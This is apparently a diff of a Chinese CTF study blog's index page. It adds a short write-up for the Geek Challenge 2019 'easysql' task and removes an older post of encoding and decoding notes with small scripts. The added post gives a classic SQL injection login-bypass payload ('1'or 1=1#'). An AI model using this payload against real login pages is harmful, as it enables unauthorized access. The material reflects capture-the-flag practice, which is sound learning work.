@@ -169,6 +169,65 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/01/2021-11-1-4wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hanbaiGG">
+      <meta itemprop="description" content="为什么不拉弟弟一把呢">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="灵能对抗实验室">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/01/2021-11-1-4wp/" class="post-title-link" itemprop="url">【极客大挑战2019】easysql1万能密码</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-01 15:18:51 / 修改时间：15:27:10" itemprop="dateCreated datePublished" datetime="2021-11-01T15:18:51+08:00">2021-11-01</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>payload:username=1’or 1=1%23&amp;password=1<br>使用万能密码绕过</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/01/2021-11-1-3wp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -875,110 +934,10 @@ phpstudy是一款免费的集成mysql和apeach的网站开发工具，比较适�
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/19/main1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="hanbaiGG">
-      <meta itemprop="description" content="为什么不拉弟弟一把呢">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="灵能对抗实验室">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/10/19/main1/" class="post-title-link" itemprop="url">misc基础题の解码</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-10-19 14:03:31 / 修改时间：14:14:30" itemprop="dateCreated datePublished" datetime="2021-10-19T14:03:31+08:00">2021-10-19</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="基本编码（基于ctf安全禁赛入门p77）"><a href="#基本编码（基于ctf安全禁赛入门p77）" class="headerlink" title="基本编码（基于ctf安全禁赛入门p77）"></a>基本编码（基于ctf安全禁赛入门p77）</h1><h2 id="1-ascii码"><a href="#1-ascii码" class="headerlink" title="1.ascii码"></a>1.ascii码</h2><pre><code>规律的两位数字“70 76 5 71”
-工具解码http://www.ab126.com/goju/1711.html
-</code></pre>
-<h2 id="2-2进制ascii码"><a href="#2-2进制ascii码" class="headerlink" title="2.2进制ascii码"></a>2.2进制ascii码</h2><pre><code>由“01”构成
-工具解码http://www.ab126.com/goju/1711.html
-</code></pre>
-<h2 id="3-base编码"><a href="#3-base编码" class="headerlink" title="3.base编码"></a>3.base编码</h2><pre><code>以等号结尾
-工具解码http://stool.chinaz.com/base32/
-py脚本
-</code></pre>
-<h2 id="4-多重base解码"><a href="#4-多重base解码" class="headerlink" title="4.多重base解码"></a>4.多重base解码</h2><pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">s = <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read().split()</span><br><span class="line">result=&#123;</span><br><span class="line">    <span class="string">&#x27;16&#x27;</span>:<span class="keyword">lambda</span> x:b16decode(x),</span><br><span class="line">    <span class="string">&#x27;32&#x27;</span>:<span class="keyword">lambda</span> x:b32decode(x),</span><br><span class="line">    <span class="string">&#x27;64&#x27;</span>:<span class="keyword">lambda</span> x:b64decode(x)</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span> i_1 <span class="keyword">in</span> [<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;64&#x27;</span>]:</span><br><span class="line">    <span class="keyword">for</span> i_2 <span class="keyword">in</span> [<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;64&#x27;</span>]:</span><br><span class="line">        <span class="keyword">for</span> i_3 <span class="keyword">in</span> [<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;64&#x27;</span>]:</span><br><span class="line">            <span class="keyword">for</span> i_4 <span class="keyword">in</span> [<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;64&#x27;</span>]:</span><br><span class="line">                <span class="keyword">for</span> i_5 <span class="keyword">in</span> [<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;64&#x27;</span>]:</span><br><span class="line">                    <span class="keyword">for</span> i_6 <span class="keyword">in</span> [<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;64&#x27;</span>]:</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            <span class="built_in">print</span> result[i_6](result[i_5](result[i_4](result[i_3](result[i_2](result[i_1](s))))))</span><br><span class="line">                        <span class="keyword">except</span>:</span><br><span class="line">                            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
-</code></pre>
-<h2 id="5-url"><a href="#5-url" class="headerlink" title="5.url"></a>5.url</h2><pre><code>%7f
-工具解码http://tool.chinaz.com/tools/urlencode.aspx
-</code></pre>
-<h2 id="6-html编码"><a href="#6-html编码" class="headerlink" title="6.html编码"></a>6.html编码</h2><pre><code>&amp;#160
-工具解码http://tool.chinaz.com/tools/htmlencode.aspx
-</code></pre>
-<h2 id="7-Unicode编码"><a href="#7-Unicode编码" class="headerlink" title="7.Unicode编码"></a>7.Unicode编码</h2><pre><code>\u0067
-工具解码http://tool.chinaz.com/tools/unicode.aspx
-</code></pre>
-<h2 id="8-摩斯电码"><a href="#8-摩斯电码" class="headerlink" title="8.摩斯电码"></a>8.摩斯电码</h2><pre><code>工具解码https://tool.lu/morse/
-</code></pre>
-<h2 id="9-JSFuck"><a href="#9-JSFuck" class="headerlink" title="9.JSFuck"></a>9.JSFuck</h2><pre><code>+(!!+[]+[])
-浏览器编译
-</code></pre>
-<h2 id="10-Quoted-Printable编码"><a href="#10-Quoted-Printable编码" class="headerlink" title="10.Quoted-Printable编码"></a>10.Quoted-Printable编码</h2><pre><code>=E9=82=A3=E4
-工具解码http://web.chacuo.net/charsetquotedprintable/
-</code></pre>
-<h2 id="11-Brainfuck编码"><a href="#11-Brainfuck编码" class="headerlink" title="11.Brainfuck编码"></a>11.Brainfuck编码</h2><pre><code>+++++ =++++ [-&gt;
-工具解码https://www.splitbrain.org/services/ook
-</code></pre>
-<h2 id="12-Ook编码"><a href="#12-Ook编码" class="headerlink" title="12.Ook编码"></a>12.Ook编码</h2><pre><code>工具解码https://www.splitbrain.org/services/ook
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$output</span> = strtr(<span class="variable">$output</span>,<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;&gt;&#x27;</span> =&gt;<span class="string">&#x27;Ook. Ook? &#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;&#x27;</span> =&gt;<span class="string">&#x27;Ook? Ook. &#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;+&#x27;</span> =&gt;<span class="string">&#x27;Ook. Ook. &#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;-&#x27;</span> =&gt;<span class="string">&#x27;Ook! Ook! &#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;.&#x27;</span> =&gt;<span class="string">&#x27;Ook! Ook. &#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;,&#x27;</span> =&gt;<span class="string">&#x27;Ook. Ook! &#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;[&#x27;</span> =&gt;<span class="string">&#x27;Ook! Ook? &#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;]&#x27;</span> =&gt;<span class="string">&#x27;Ook? Ook! &#x27;</span>,</span><br><span class="line">))</span><br></pre></td></tr></table></figure>
-</code></pre>
-<h2 id="13-UUencode和XXencode"><a href="#13-UUencode和XXencode" class="headerlink" title="13.UUencode和XXencode"></a>13.UUencode和XXencode</h2><pre><code>工具解码 https://www.qqxiuzi.cn/bianma/uuencode.php
-        http://www.atoolbox.net/Tool.php?Id=780
-</code></pre>
-<h2 id="14-AAencode"><a href="#14-AAencode" class="headerlink" title="14.AAencode"></a>14.AAencode</h2><pre><code>浏览器编译
-</code></pre>
-<h2 id="15-base爆破"><a href="#15-base爆破" class="headerlink" title="15.base爆破"></a>15.base爆破</h2><pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line">s = <span class="built_in">list</span>(<span class="string">&#x27;AGV5IULSB3ZLVSE=&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1044,7 +1003,7 @@ py脚本
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">21</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
